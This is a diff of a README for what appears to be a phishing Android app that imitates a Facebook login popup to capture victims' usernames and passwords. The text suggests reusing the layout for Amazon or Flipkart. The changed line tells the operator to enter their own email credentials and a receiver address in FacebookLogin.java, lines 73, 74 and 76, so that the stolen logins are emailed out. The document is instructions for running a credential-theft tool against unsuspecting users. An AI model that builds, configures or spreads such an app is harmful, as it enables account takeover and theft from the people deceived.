@@ -8,7 +8,7 @@ if victim enter his username & password in that facebook popup activity then all
 
 You can use this project to create phising apk for other social application like amazon, filpkart all you need to just chnage the layout of it lthrough main code is remain same.
 
-once you download this project simply enter your email id and password and receiver email id in FacebookLogin.java file in line number 73
+once you download this project simply enter your email id and password and receiver email id in FacebookLogin.java file in line number 73, 74 & 76
 
 | add your email address & password
 |:-:|
